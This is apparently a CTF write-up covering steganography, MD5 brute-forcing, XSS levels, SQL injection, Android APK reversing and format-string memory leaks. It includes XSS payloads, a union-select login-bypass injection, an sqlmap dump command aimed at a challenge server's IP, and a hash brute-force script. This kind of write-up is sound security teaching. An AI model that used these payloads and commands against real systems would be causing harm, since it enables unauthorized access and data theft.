## Forensics

### What's in the image? - Part 1

Steganography challenges are about hiding data  inside of another file. SO first thing you should try is to always carve files out of it. 
We're given a png file and running `binwalk -e steg.png` on it gives you buncha files. One of them is called flag1.txt which says `Thⅰs is ｊust a simpｌe ｔeⅹt， ⅰt ｄoｅs ｎｏt havｅ aｎy ｍeａｎiｎｇ！ bｕｔ mａybe if you look up homoglyph steganography, you can find something.`.
Google homoghylph steganography and throw it into a tool like this https://holloway.nz/steg/ and you get the flag : `flag-agz48ttpptv4wrcb`. 


### What's in the image? - Part 2

The carved files include a file protected zlib file `24D2.zlib`. The password can be found by doing something like `strings *` to print all the strings in the folder. You'll get several `Password=WPrpw9tJZGr3TAfy`. Just put in the password and unzip the file and you got the password in there.


Forensics challenges are often about finding the right tools.



## Crypto

Hardly an actual crypto challenge. You can just bruteforce md5 hashes with a script like below since we know it's a number and presumably low : 


``` import hashlib

for i in range(0, 1000000):
	if hashlib.md5(b'ChalmersGuKTH_%d'%i).hexdigest() == "a55d514f07a8a22c4886261a8175f640":
		print(i)
		break
```

And you'll get the answer. 



## Warm-up XSS

Win the first level by doing : `</b> <script>alert(document.domain);</script>` etc: 

![image](https://user-images.githubusercontent.com/34951444/118034331-2692eb00-b36a-11eb-9025-851122eb0be8.png)




Or be a big brain unlike me and open the chrome console and just type in `alert(document.domain);` for every level. 


## XSS continues...

Same here. You can either solve every XSS one by one which we did : 

![image](https://user-images.githubusercontent.com/34951444/118034800-af118b80-b36a-11eb-8b04-369f1be0234f.png)

Or go for the 5head solution, which is just calling `alert(document.domain);` till you find the flag.


## SQL

### Can you login?

We've been given the source : 


``` exports.postlogin = function(req, res){

  var input = JSON.parse(JSON.stringify(req.body));
  req.getConnection(function(err, connection){

    // SQL QUERY!
    var query = connection.query("SELECT password FROM users WHERE email = '" + input.email + "'", function(err, rows) {

      // Check if password is correct
      if( rows && rows[0] && input.password == rows[0].password ) { 
        res.render("profile-login",{
          title : "Login Challenge",
          secondaryTitle: "[REDACTED]",
        })
      } else {
        res.render("profile-login",{
          title : "Login Challenge",
          secondaryTitle: "ACCESS DENIED",
        })
      }
    });
  });
}
``` 

This is a simple sql injection. What we need to do is to pass the if check there, which means that rows[0] needs to exist and rows[0].password needs to be equal to our password. 
Let's do that then. If nothing is selected by the first part of the select in question we can just add another where something is selected so it will be the first row. Since we have a simple sql injection in the username we can easily do that with a union select as: 

```
Email address : hakupiku' union select 5 as password;#
Password: 5 
```

The flag is `CTF{I_Decide_The_Password}`.

### Profile Challenge

If you look at the request that's being made when you click on different orderings - last name / first name etc, you can see that it's being sent as a query. Considering this an easy XSS challenge, 
it has to be something very obvious, like it's order by followed by coloumn name. So what happens if add something to that? Cool but too pressed on time against the boys from Chalmers so might as well just run Sqlmap : 


`sqlmap -u "http://40.69.84.14/profiles?order=first_name" -T flag --dump`

Gives the flag. Intended solution is probably doing case with a boolean expression to brute the flag. 


## Android

### Dynamic flag 

Install jadx, unpack the APK file.

![image](https://user-images.githubusercontent.com/34951444/118037155-c3a35300-b36d-11eb-960f-b2bcc61cc8ba.png)

Just search for the word flag and look through it or check the "lbs.ctf.dynamicflag" files directly. Wohoo and you got the function that generates the flag : 

![image](https://user-images.githubusercontent.com/34951444/118037417-1977fb00-b36e-11eb-8ac7-ba87fd6b4fe7.png)

Just run it on your own and see the output as byte values. Parse them as ascii characters and you got the flag.


### Webview Flag

Unpack the apk file. Basically check the same part of the code as the other challenge, and you can find which address they're going that they calculated by taking the sha256 hash of some values : 


```public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(C0744R.layout.activity_main);
        WebView webView = (WebView) findViewById(C0744R.C0747id.webview);
        webView.setWebViewClient(new WebViewClient());
        Uri data = getIntent().getData();
        String str1 = "http://40.69.84.14/webview";
        if (data != null) {
            str1 = str1 + data.toString().substring(26);
        }
        try {
            MessageDigest sha256 = MessageDigest.getInstance("SHA-256");
            sha256.update("wm8qRMgVBW5wjUJK".getBytes(StandardCharsets.UTF_8));
            sha256.update(str1.getBytes(StandardCharsets.UTF_8));
            webView.loadUrl(str1 + "?hash=" + bytesToHex(sha256.digest()));
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
    }

    public static String bytesToHex(byte[] bytes) {
        StringBuffer result = new StringBuffer();
        for (byte byt : bytes) {
            result.append(Integer.toString((byt & 255) + 256, 16).substring(1));
        }
        return result.toString().toUpperCase();
    }
``` 

We know everything except `data` to calculate the same hash ourselves. If we go to the address in the str1 we'll get to the url `http://40.69.84.14/webview/flagview` and from the hint and how the hash was accepted, after a few tries we realized `flagview` was the contents of `data`.

So my solve script was as below : 

``` 
import hashlib

m = hashlib.sha256()
m.update("wm8qRMgVBW5wjUJK".encode())
m.update("http://40.69.84.14/webview/flagview".encode())
m.digest().hex().upper() ## Upper bc their bytesToHex function does that too 
```

The flag is at `http://40.69.84.14/webview/flagview?hash=C76B291DA89DCD884B742FE7725992FA3BE6978E8ECA24E51E6E5DAE9576F571`. 



## Binary

### Buffered secrets

Just do  the below for an easy overread : 

![image](https://user-images.githubusercontent.com/34951444/118038705-bedf9e80-b36f-11eb-85b6-26ecfecc5cc1.png)


### String format vulnerability


Just spam `%x` to leak memory and then just throw it into something like Cyberchef. Convert from Hex and swap endianness. 

![image](https://user-images.githubusercontent.com/34951444/118039165-53e29780-b370-11eb-8e8d-ffb5dac57b5b.png)


There you go. You got the flag.
